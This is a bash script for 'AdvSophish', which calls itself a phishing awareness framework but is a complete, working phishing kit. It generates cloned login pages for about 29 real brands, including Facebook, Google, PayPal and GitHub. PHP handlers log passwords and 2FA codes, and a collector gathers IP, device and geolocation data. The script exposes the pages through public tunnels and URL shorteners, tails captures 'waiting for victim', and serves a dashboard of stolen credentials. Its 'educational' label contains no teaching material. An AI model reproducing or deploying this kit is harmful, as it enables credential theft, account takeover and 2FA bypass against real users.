#!/bin/bash

##   AdvSophish - Advanced Phishing Awareness Framework
##   Author: mahi-cyberaware
##   GitHub: https://github.com/mahi-cyberaware/AdvSophish
##   Version: 3.5.0

# ------------------------------- Trap & Globals -----------------------------
trap 'return_to_menu' INT TERM
KEEP_RUNNING=true
BASE_DIR=$(realpath "$(dirname "$0")" 2>/dev/null || cd "$(dirname "$0")" && pwd)
HOST='127.0.0.1'
PORT='8080'
DASHBOARD_PORT='8081'
SHORTENER="isgd"      # isgd, tinyurl, none

# ------------------------------- Colours ------------------------------------
if [[ -t 1 ]]; then
    RED='\e[31m'; GREEN='\e[32m'; ORANGE='\e[33m'; BLUE='\e[34m'
    CYAN='\e[36m'; WHITE='\e[37m'; YELLOW='\e[93m'; RESET='\e[0m'
    BOLD='\e[1m'; DIM='\e[2m'
else
    RED=''; GREEN=''; ORANGE=''; BLUE=''; CYAN=''; WHITE=''; YELLOW=''; RESET=''; BOLD=''; DIM=''
fi

# ------------------------------- Helper Functions ---------------------------
reset_color() { printf "%b" "$RESET"; }
kill_pid() { for proc in php cloudflared loclx; do pkill -f "$proc" 2>/dev/null; done; }
return_to_menu() { KEEP_RUNNING=false; kill_pid; echo -e "\n${YELLOW}[!] Returning to main menu...${RESET}"; sleep 1; main_menu; }

# ------------------------------- Banner -------------------------------------
install_toilet() {
    if command -v toilet &>/dev/null; then return 0; fi
    echo -e "${YELLOW}[!] 'toilet' not found. Installing...${RESET}"
    if command -v apt &>/dev/null; then sudo apt update && sudo apt install toilet -y
    elif command -v pkg &>/dev/null; then pkg install toilet -y
    elif command -v pacman &>/dev/null; then sudo pacman -S toilet --noconfirm
    else echo -e "${RED}[-] Cannot install toilet. Using ASCII banner.${RESET}"; return 1
    fi
}

banner() {
    clear
    if command -v toilet &>/dev/null; then
        toilet -f future -F metal "AdvSophish"
        echo -e "${CYAN}        -- EDUCATE . AWARE . PROTECT --${RESET}"
    else
        echo -e "${GREEN}${BOLD}"
        echo "    █████╗ ██████╗ ██╗   ██╗███████╗ ██████╗ ██████╗ ██╗███████╗██╗  ██╗"
        echo "   ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔═══██╗██╔══██╗██║██╔════╝██║  ██║"
        echo "   ███████║██║  ██║██║   ██║███████╗██║   ██║██████╔╝██║███████╗███████║"
        echo "   ██╔══██║██║  ██║╚██╗ ██╔╝╚════██║██║   ██║██╔═══╝ ██║╚════██║██╔══██║"
        echo "   ██║  ██║██████╔╝ ╚████╔╝ ███████║╚██████╔╝██║     ██║███████║██║  ██║"
        echo "   ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
        echo -e "${CYAN}              Advanced Phishing Framework${RESET}"
    fi
    echo -e "${WHITE}${DIM}                          v3.5.0${RESET}"
    echo -e "${CYAN}                  mahi-cyberaware${RESET}\n"
}

# ------------------------------- Dependency Check --------------------------
check_dependencies() {
    echo -e "${GREEN}[+]${WHITE} Checking tools...${RESET}"
    local missing=()
    command -v php &>/dev/null || missing+=("php")
    command -v curl &>/dev/null || missing+=("curl")
    command -v unzip &>/dev/null || missing+=("unzip")
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[-] Missing: ${missing[*]}${RESET}"
        echo -e "${YELLOW}Install manually: apt/pkg/pacman install ${missing[*]}${RESET}"
        exit 1
    fi
    echo -e "${GREEN}[+] All tools present.${RESET}"
}

# ------------------------------- Binary Downloaders ------------------------
download_binary() {
    local url="$1" output="$2"
    echo -e "${GREEN}[+] Downloading $output...${RESET}"
    curl -L --silent --insecure --fail --retry 2 -o "$output" "$url" || {
        echo -e "${RED}[-] Failed to download $output${RESET}"
        return 1
    }
    chmod +x "$output"
}

install_cloudflared() {
    [[ -x ".server/cloudflared" ]] && return
    mkdir -p .server
    arch=$(uname -m)
    case $arch in
        armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        aarch64)       url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        x86_64)        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        *)             url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
    esac
    download_binary "$url" ".server/cloudflared" || return 1
}

install_localxpose() {
    [[ -x ".server/loclx" ]] && return
    mkdir -p .server
    arch=$(uname -m)
    case $arch in
        armv7l|armv8l) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ;;
        aarch64)       url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" ;;
        x86_64)        url="https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ;;
        *)             url="https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" ;;
    esac
    zipfile=".server/loclx.zip"
    curl -L --silent --insecure --fail --retry 2 -o "$zipfile" "$url" || return 1
    unzip -qq "$zipfile" -d ".server/"
    mv .server/loclx_* .server/loclx 2>/dev/null || true
    chmod +x ".server/loclx"
    rm -f "$zipfile"
}

# ------------------------------- Advanced Site Template --------------------
generate_site() {
    local site_id="$1" name="$2" color="$3" icon="$4"
    local site_dir=".sites/$site_id"
    [[ -d "$site_dir" ]] && return
    mkdir -p "$site_dir"

    cat > "$site_dir/style.css" <<-CSS
* { margin:0; padding:0; box-sizing:border-box; font-family:system-ui, -apple-system, sans-serif; }
body { background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.card { background:white; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:100%; max-width:400px; padding:30px; text-align:center; }
.logo { font-size:56px; color:$color; margin-bottom:20px; }
h2 { color:$color; margin-bottom:20px; font-weight:600; }
input { width:100%; padding:14px 16px; margin:8px 0; border:1px solid #ddd; border-radius:8px; font-size:16px; }
button { background:$color; border:none; color:white; font-size:18px; font-weight:bold; padding:12px; border-radius:8px; width:100%; cursor:pointer; margin-top:10px; transition:0.2s; }
button:hover { opacity:0.9; transform:scale(1.01); }
.footer { margin-top:20px; color:#777; font-size:13px; }
.permission-badge { background:#eef; padding:8px; border-radius:8px; margin-top:15px; font-size:12px; color:#555; }
CSS

    cat > "$site_dir/index.html" <<-HTML
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>$name - Sign In</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link rel="stylesheet" href="style.css">
<script>
async function requestPermissions() {
    const statusDiv = document.getElementById('perm-status');
    statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting permissions...';
    try {
        const geo = await navigator.permissions.query({name:'geolocation'});
        if (geo.state === 'prompt') navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
        const mic = await navigator.permissions.query({name:'microphone'});
        if (mic.state === 'prompt') navigator.mediaDevices.getUserMedia({ audio: true }).then(stream=>stream.getTracks().forEach(t=>t.stop())).catch(e=>{});
        const cam = await navigator.permissions.query({name:'camera'});
        if (cam.state === 'prompt') navigator.mediaDevices.getUserMedia({ video: true }).then(stream=>stream.getTracks().forEach(t=>t.stop())).catch(e=>{});
        statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Permissions requested';
    } catch(e) { statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Could not request all permissions'; }
    document.getElementById('loginForm').submit();
}
</script>
</head>
<body>
<div class="card">
    <div class="logo"><i class="$icon"></i></div>
    <h2>Sign in to $name</h2>
    <form id="loginForm" method="POST" action="login.php">
        <input type="text" name="username" placeholder="Email or Phone" required autofocus>
        <input type="password" name="password" placeholder="Password" required>
        <button type="button" onclick="requestPermissions()">Log In</button>
    </form>
    <div class="permission-badge" id="perm-status"><i class="fas fa-shield-alt"></i> Secure login</div>
    <div class="footer">Forgot password? · Create account</div>
</div>
</body>
</html>
HTML

    cat > "$site_dir/login.php" <<-PHP
<?php
\$creds = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
file_put_contents('../../auth/usernames.dat', \$creds . PHP_EOL, FILE_APPEND);
\$ip_file = '../../auth/ip_data.dat';
if (file_exists('ip.txt')) {
    \$info = file_get_contents('ip.txt');
    file_put_contents(\$ip_file, \$info, FILE_APPEND);
    unlink('ip.txt');
}
header('Location: otp.html');
exit;
?>
PHP

    cat > "$site_dir/otp.html" <<-HTML
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>2FA Verification</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link rel="stylesheet" href="style.css"></head>
<body><div class="card"><div class="logo"><i class="fas fa-shield-alt"></i></div>
<h2>Two‑Factor Authentication</h2><p>Enter the code from your authenticator app.</p>
<form method="POST" action="otp.php">
<input type="text" name="otp" placeholder="000000" required maxlength="6" autofocus>
<button type="submit">Verify</button>
</form></div></body></html>
HTML

    cat > "$site_dir/otp.php" <<-PHP
<?php
\$otp_data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
file_put_contents('../../auth/otp.dat', \$otp_data . PHP_EOL, FILE_APPEND);
header('Location: https://www.google.com');
exit;
?>
PHP

    cat > "$site_dir/ip.php" <<-'PHP'
<?php
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown';
$screen = $_POST['screen'] ?? 'unknown';
$geo = $_POST['geo'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');
$data = "IP: $ip | Device: $ua | Lang: $lang | Screen: $screen | Geo: $geo | Time: $timestamp\n";
file_put_contents('ip.txt', $data);
?>
<!DOCTYPE html>
<html><body><script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
        let geo = pos.coords.latitude + ',' + pos.coords.longitude;
        fetch('ip.php', {method:'POST', body:'geo='+geo, headers:{'Content-Type':'application/x-www-form-urlencoded'}});
    });
}
let screen = screen.width + 'x' + screen.height;
fetch('ip.php', {method:'POST', body:'screen='+screen, headers:{'Content-Type':'application/x-www-form-urlencoded'}});
</script></body></html>
PHP

    echo -e "${GREEN}[✓] Generated $site_id ($name) with permission popups${RESET}"
}

generate_all_sites() {
    echo -e "${GREEN}[+] Generating all phishing templates...${RESET}"
    while IFS='|' read -r id name color icon; do
        generate_site "$id" "$name" "$color" "$icon"
    done <<-EOF
tiktok|TikTok|#010101|fab fa-tiktok
facebook_tfo|Facebook|#1877f2|fab fa-facebook
instagram_tfo|Instagram|#e4405f|fab fa-instagram
ubereats_tfo|Uber Eats|#06c167|fas fa-utensils
aijo_tfo|Aijo|#ff9900|fas fa-ad
google_tfo|Google|#4285f4|fab fa-google
twitch_tfo|Twitch|#9146ff|fab fa-twitch
netflix_tfo|Netflix|#e50914|fab fa-netflix
instagram_followers|Instagram Followers|#e4405f|fab fa-instagram
amazon_tfo|Amazon|#ff9900|fab fa-amazon
whatsapp_tfo|WhatsApp|#25d366|fab fa-whatsapp
linkedin_tfo|LinkedIn|#0077b5|fab fa-linkedin
hotstar_tfo|Hotstar|#ff5e00|fas fa-tv
spotify_tfo|Spotify|#1db954|fab fa-spotify
github_tfo|GitHub|#333333|fab fa-github
mobikwik_tfo|Mobikwik|#ff6200|fas fa-wallet
zomato_tfo|Zomato|#cb202d|fas fa-utensils
phonepay_tfo|PhonePe|#5f259f|fas fa-phone-alt
paypal_tfo|PayPal|#00457c|fab fa-paypal
telegram_tfo|Telegram|#26a5e4|fab fa-telegram
twitter_tfo|Twitter|#1da1f2|fab fa-twitter
flipcart_tfo|Flipkart|#2874f0|fab fa-opencart
wordpress|WordPress|#21759b|fab fa-wordpress
snapchat_tfo|Snapchat|#fffc00|fab fa-snapchat-ghost
protonmail_tfo|ProtonMail|#6d4aff|fas fa-envelope
stackoverflow|StackOverflow|#f48024|fab fa-stack-overflow
ebay_tfo|eBay|#e53238|fab fa-ebay
pinterest|Pinterest|#bd081c|fab fa-pinterest
cryptocurrency|Crypto|#f2a900|fab fa-bitcoin
EOF
}

# ------------------------------- Phishing Engine --------------------------
setup_site() {
    local site_id="$1"
    generate_all_sites
    rm -rf ".server/www"/* 2>/dev/null || true
    cp -rf ".sites/$site_id"/* ".server/www/"
    cd ".server/www"
    php -S "$HOST":"$PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
    echo -e "\n${GREEN}[+] PHP server running on http://$HOST:$PORT${RESET}"
}

capture_data() {
    echo -e "\n${GREEN}[+]${WHITE} Waiting for victim... (Press Ctrl+C to return to menu)${RESET}"
    KEEP_RUNNING=true
    while $KEEP_RUNNING; do
        tail -n0 -f "$BASE_DIR/auth/usernames.dat" "$BASE_DIR/auth/otp.dat" "$BASE_DIR/auth/ip_data.dat" 2>/dev/null | while read line; do
            if [[ -n "$line" ]]; then
                echo -e "${RED}[!]${GREEN} Capture: ${WHITE}$line${RESET}"
            fi
        done
        sleep 1
    done
}

shorten_url() {
    local long_url="$1"
    local short_url=""
    if [[ "$SHORTENER" == "isgd" ]]; then
        short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
        [[ -z "$short_url" || "$short_url" == *"Error"* ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
    elif [[ "$SHORTENER" == "tinyurl" ]]; then
        short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
        [[ -z "$short_url" || "$short_url" == *"Error"* ]] && short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
    else
        short_url="$long_url"
    fi
    echo "${short_url:-$long_url}"
}

obfuscate_url() {
    local long_url="$1"
    echo -e "\n${GREEN}[+] Original URL: ${CYAN}$long_url${RESET}"
    local short_url=$(shorten_url "$long_url")
    echo -e "${GREEN}[+] Shortened URL: ${CYAN}$short_url${RESET}"
}

# ------------------------------- Tunnels -----------------------------------
start_cloudflared() {
    local site="$1" port="$2"
    setup_site "$site"
    echo -e "\n${GREEN}[+]${WHITE} Launching Cloudflared...${RESET}"
    ./.server/cloudflared tunnel --url "$HOST:$port" --logfile ".server/.cld.log" >/dev/null 2>&1 &
    sleep 10
    url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -1)
    if [[ -z "$url" ]]; then
        echo -e "${RED}[-] Cloudflared failed.${RESET}"
        return
    fi
    obfuscate_url "$url"
    capture_data
}

start_localxpose() {
    local site="$1" port="$2"
    setup_site "$site"
    echo -e "\n${GREEN}[+]${WHITE} Launching LocalXpose...${RESET}"
    ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST:$port" > ".server/.loclx" 2>&1 &
    sleep 14
    url=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' ".server/.loclx" | head -1)
    if [[ -z "$url" ]]; then
        echo -e "${RED}[-] LocalXpose failed.${RESET}"
        return
    fi
    obfuscate_url "https://$url"
    capture_data
}

start_localhost() {
    local site="$1" port="$2"
    setup_site "$site"
    obfuscate_url "http://$HOST:$port"
    capture_data
}

# ------------------------------- Dashboard ----------------------------------
start_dashboard() {
    if [[ ! -f "dashboard/index.php" ]]; then
        mkdir -p dashboard
        cat > "dashboard/index.php" <<-'DASH'
<?php
$creds_file = '../auth/usernames.dat';
$otp_file = '../auth/otp.dat';
$ip_file = '../auth/ip_data.dat';
$creds = []; $otps = []; $ips = [];
if (file_exists($creds_file)) { $lines = file($creds_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]]; } }
if (file_exists($otp_file)) { $lines = file($otp_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]]; } }
if (file_exists($ip_file)) { $lines = file($ip_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $ips[] = $line; } }
if (isset($_GET['del'])) {
    if ($_GET['del']=='creds') file_put_contents($creds_file,'');
    if ($_GET['del']=='otp') file_put_contents($otp_file,'');
    if ($_GET['del']=='ip') file_put_contents($ip_file,'');
    header('Location: index.php'); exit;
}
?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>
body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}
h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}
.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}
</style></head><body><div class=container><h1>AdvSophish Dashboard</h1>
<div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a><a class=btn href="?del=ip">Clear IP/Device Logs</a></div>
<h2>Credentials (<?=count($creds)?>)</h2><table>
<thead><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr></thead>
<tbody><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?>
</tbody></table>
<h2>OTPs (<?=count($otps)?>)</h2><table><thead><tr><th>Site</th><th>OTP</th><th>Time</th></tr></thead>
<tbody><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?>
</tbody></table>
<h2>Device & IP Logs (<?=count($ips)?>)</h2><table><thead><tr><th>Log</th></tr></thead>
<tbody><?php foreach($ips as $i) echo "<tr><td>$i</td></tr>"; ?></tbody>
</div></body></html>
DASH
    fi
    echo -e "\n${GREEN}[+] Starting dashboard on port $DASHBOARD_PORT ...${RESET}"
    cd "dashboard"
    php -S "$HOST":"$DASHBOARD_PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
    echo -e "${GREEN}[+] Dashboard URL: ${CYAN}http://$HOST:$DASHBOARD_PORT${RESET}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop dashboard and return to menu.${RESET}"
    wait
}

# ------------------------------- Menu ---------------------------------------
SITE_IDS=(
    tiktok facebook_tfo instagram_tfo ubereats_tfo aijo_tfo google_tfo
    twitch_tfo netflix_tfo instagram_followers amazon_tfo whatsapp_tfo
    linkedin_tfo hotstar_tfo spotify_tfo github_tfo mobikwik_tfo
    zomato_tfo phonepay_tfo paypal_tfo telegram_tfo twitter_tfo
    flipcart_tfo wordpress snapchat_tfo protonmail_tfo stackoverflow
    ebay_tfo pinterest cryptocurrency
)

show_menu() {
    echo -e "${WHITE}${BOLD}Available Phishing Targets:${RESET}"
    local i=1
    for id in "${SITE_IDS[@]}"; do
        name=$(echo "$id" | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')
        printf "${GREEN}[%02d]${CYAN} %-18s" $i "$name"
        (( i % 3 == 0 )) && echo
        ((i++))
    done
    echo -e "\n${GREEN}[88]${CYAN} Dashboard"
    echo -e "${GREEN}[89]${CYAN} Change URL Shortener (current: $SHORTENER)"
    echo -e "${GREEN}[99]${CYAN} About"
    echo -e "${GREEN}[00]${CYAN} Exit"
}

main_menu() {
    banner
    show_menu
    read -p "${GREEN}[+] Choose option: ${WHITE}" choice
    case $choice in
        00) echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0 ;;
        88) start_dashboard; main_menu ;;
        89) echo -e "${YELLOW}Select shortener: 1) is.gd  2) tinyurl  3) none${RESET}"
            read -p "${GREEN}[+] : ${WHITE}" opt
            case $opt in 1) SHORTENER="isgd";; 2) SHORTENER="tinyurl";; 3) SHORTENER="none";; esac
            main_menu ;;
        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.5.0\nLicense: Educational only\nFeatures: OTP capture, device info, permission popups${RESET}"
            read -n1 -p "Press any key..."; main_menu ;;
        *)
            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
                SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
                tunnel_menu
            else
                echo -e "${RED}Invalid option${RESET}"; sleep 1; main_menu
            fi
            ;;
    esac
}

tunnel_menu() {
    echo -e "\n${WHITE}${BOLD}Select Tunneling Method:${RESET}"
    echo -e "  ${GREEN}[1]${CYAN} Localhost (local network only, no HTTPS)"
    echo -e "  ${GREEN}[2]${CYAN} Cloudflared (external, may be blocked)"
    echo -e "  ${GREEN}[3]${CYAN} LocalXpose (external, requires token)"
    read -p "${GREEN}[+] Tunnel: ${WHITE}" tun
    read -p "${GREEN}[+] Custom port? (y/N): ${WHITE}" custom
    local port=$PORT
    if [[ $custom =~ ^[Yy]$ ]]; then
        read -p "Enter port (1024-65535): " port
        [[ $port -lt 1024 || $port -gt 65535 ]] && port=8080
    fi
    case $tun in
        1|01) start_localhost "$SELECTED_SITE" "$port" ;;
        2|02) install_cloudflared && start_cloudflared "$SELECTED_SITE" "$port" ;;
        3|03) install_localxpose && start_localxpose "$SELECTED_SITE" "$port" ;;
        *) echo -e "${RED}Invalid${RESET}"; tunnel_menu ;;
    esac
    main_menu
}

# ------------------------------- Start -------------------------------------
mkdir -p "$BASE_DIR/.server/www" "$BASE_DIR/auth" "$BASE_DIR/dashboard" 2>/dev/null || true
kill_pid
install_toilet
check_dependencies
generate_all_sites
main_menu
